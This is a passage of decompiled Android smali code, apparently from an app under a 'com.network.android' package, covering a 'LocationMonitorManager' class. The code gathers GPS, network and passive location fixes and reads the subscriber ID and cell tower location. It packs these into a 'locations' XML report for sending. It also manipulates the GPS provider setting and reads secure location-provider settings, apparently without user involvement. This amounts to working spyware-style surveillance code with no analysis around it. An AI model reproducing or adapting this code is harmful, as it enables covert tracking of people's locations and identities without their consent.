    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    if-eqz v1, :cond_0

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lcom/network/android/v;->a(Z)V

    const-string v1, "LocationMonitorManager stop GPS removeUpdates"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    sget-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    if-eqz v1, :cond_1

    sget-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    const-string v1, "LocationMonitorManager stop Pasive removeUpdates"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_1
    sget-object v1, Lcom/network/location/a;->h:Lcom/network/android/v;

    if-eqz v1, :cond_2

    sget-object v1, Lcom/network/location/a;->h:Lcom/network/android/v;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    const-string v0, "LocationMonitorManager stop Network removeUpdates"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_2
    const/4 v0, 0x0

    sput-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-static {p0}, Lcom/network/location/a;->g(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager Location stop Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static f(Landroid/content/Context;)V
    .locals 6

    const/4 v0, 0x0

    :try_start_0
    const-string v1, "LocationMonitorManager collectLocationData start"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/b/b;->w()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    mul-long v2, v1, v3

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    if-eqz v1, :cond_0

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v1}, Lcom/network/android/v;->c()Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v1}, Lcom/network/android/v;->a()Landroid/location/Location;

    move-result-object v1

    if-eqz v1, :cond_0

    sget-object v1, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v1}, Lcom/network/android/v;->a()Landroid/location/Location;

    move-result-object v1

    invoke-static {v1, v2, v3}, Lcom/network/location/a;->a(Landroid/location/Location;J)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    move-result v1

    if-eqz v1, :cond_0

    :try_start_1
    const-string v0, "LocationMonitorManager add GPS"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->a()Landroid/location/Location;

    move-result-object v0

    invoke-virtual {v0}, Landroid/location/Location;->getTime()J

    invoke-static {p0, v0}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/Location;)V

    sget-object v0, Lcom/network/location/a;->c:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->b()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    :goto_0
    :try_start_2
    const-string v0, "LocationMonitorManager collectLocationData Sample end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_1
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "mlocListener thread Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    invoke-static {p0}, Lcom/network/location/a;->h(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager collectLocationData Exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    invoke-static {p0}, Lcom/network/location/a;->h(Landroid/content/Context;)V

    goto :goto_1

    :cond_0
    :try_start_3
    const-string v1, "LocationMonitorManager add Network or passive"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    if-eqz v1, :cond_6

    sget-object v1, Lcom/network/location/a;->i:Lcom/network/android/v;

    invoke-virtual {v1}, Lcom/network/android/v;->a()Landroid/location/Location;

    move-result-object v1

    :goto_2
    sget-object v4, Lcom/network/location/a;->h:Lcom/network/android/v;

    if-eqz v4, :cond_1

    sget-object v0, Lcom/network/location/a;->h:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->a()Landroid/location/Location;

    move-result-object v0

    :cond_1
    if-eqz v1, :cond_4

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "LocationMonitorManager collectLocationData pasiveLocation source:"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v4, "gps"

    invoke-virtual {v1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-static {v1, v2, v3}, Lcom/network/location/a;->a(Landroid/location/Location;J)Z

    move-result v4

    if-eqz v4, :cond_2

    const-string v0, "LocationMonitorManager collectLocationData add pasiveLocation GPS"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/location/Location;->getTime()J

    invoke-static {p0, v1}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/Location;)V

    sget-object v0, Lcom/network/location/a;->i:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->b()V

    goto/16 :goto_0

    :cond_2
    const-string v1, "LocationMonitorManager collectLocationData passive location is not a GPS or time not valid - > try to take a network location"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz v0, :cond_3

    invoke-static {v0, v2, v3}, Lcom/network/location/a;->a(Landroid/location/Location;J)Z

    move-result v1

    if-eqz v1, :cond_3

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager collectLocationData add networkLocation location source:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/location/Location;->getTime()J

    invoke-static {p0, v0}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/Location;)V

    sget-object v0, Lcom/network/location/a;->h:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->b()V

    goto/16 :goto_0

    :cond_3
    const-string v0, "LocationMonitorManager collectLocationData add addCell after NO pasiveLocation and NO networkLocation"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/location/a;->h(Landroid/content/Context;)V

    goto/16 :goto_0

    :cond_4
    if-eqz v0, :cond_5

    invoke-static {v0, v2, v3}, Lcom/network/location/a;->a(Landroid/location/Location;J)Z

    move-result v1

    if-eqz v1, :cond_5

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager collectLocationData add networkLocation location source:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/location/Location;->getTime()J

    invoke-static {p0, v0}, Lcom/network/location/a;->a(Landroid/content/Context;Landroid/location/Location;)V

    sget-object v0, Lcom/network/location/a;->h:Lcom/network/android/v;

    invoke-virtual {v0}, Lcom/network/android/v;->b()V

    goto/16 :goto_0

    :cond_5
    const-string v0, "LocationMonitorManager collectLocationData add addCell after NO pasiveLocation and NO networkLocation"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/location/a;->h(Landroid/content/Context;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_0

    :cond_6
    move-object v1, v0

    goto/16 :goto_2
.end method

.method private static g(Landroid/content/Context;)V
    .locals 3

    :try_start_0
    invoke-static {p0}, Lcom/network/b/a;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "LocationMonitorManager resetAllowedProvider addGps: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "gps"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/network/location/a;->a(Landroid/content/ContentResolver;Ljava/lang/String;Z)V

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "location_providers_allowed"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager resetAllowedProvider allowedProviderNew: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "NetworkLocation"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "gp"

    sget-object v2, Lcom/network/location/a;->g:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager resetAllowedProvider Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method private static h(Landroid/content/Context;)V
    .locals 7

    :try_start_0
    const-string v0, "LocationMonitorManager addCell"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCellLocation()Landroid/telephony/CellLocation;

    move-result-object v1

    check-cast v1, Landroid/telephony/gsm/GsmCellLocation;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_0

    if-eqz v2, :cond_0

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v2

    new-instance v4, Ljava/io/StringWriter;

    invoke-direct {v4}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v2, v4}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v5, ""

    const-string v6, "locations"

    invoke-interface {v2, v5, v6}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v2, p0}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/Context;)V

    invoke-static {v2, v1, v3, v0}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Landroid/telephony/gsm/GsmCellLocation;Ljava/lang/String;Landroid/telephony/TelephonyManager;)V

    const-string v0, ""

    const-string v1, "locations"

    invoke-interface {v2, v0, v1}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    invoke-virtual {v4}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {p0, v0, v1, v2}, Lcom/network/android/j;->a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;[[B)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "LocationMonitorManager addCell Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
